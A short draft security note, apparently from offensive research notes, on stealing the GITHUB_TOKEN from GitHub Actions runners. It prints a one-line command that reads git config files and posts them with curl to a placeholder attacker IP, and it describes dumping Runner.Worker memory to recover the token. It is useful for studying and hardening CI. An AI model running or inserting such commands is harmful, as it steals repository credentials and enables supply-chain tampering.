# [DRAFT] The `GITHUB_TOKEN`

With the `GITHUB_TOKEN` a malicious user can push to the base repository or manipulate it in some other way. By default the `GITHUB_TOKEN` has write permissions to all repository resources. However, this can be restricted using [permissions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#permissions).

## Exfiltration of the `GITHUB_TOKEN`

In most cases it is possible to exfiltrate the `GITHUB_TOKEN` with the following technique.

```bash
find $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}
```

This works because the [`actions/checkout`](https://github.com/actions/checkout) action [persists credentials with a local git config by default](https://github.com/actions/checkout/blob/230611dbd0eb52da1e1f4f7bc8bb0c3a339fc8b7/action.yml#L48-L50).

## Universal exfiltration of the `GITHUB_TOKEN`

There are rare cases when the `GITHUB_TOKEN` is not referenced in a workflow and not persisted with a local git config so the above technique does not work. However, the `GITHUB_TOKEN` is always passed to the `Runner.Worker` process. So after having an arbitrary code execution one could dump memory of the `Runner.Worker` process and grep the dump for the `GITHUB_TOKEN`. See https://gist.github.com/nikitastupin/30e525b776c409e03c2d6f328f254965 for the example script.
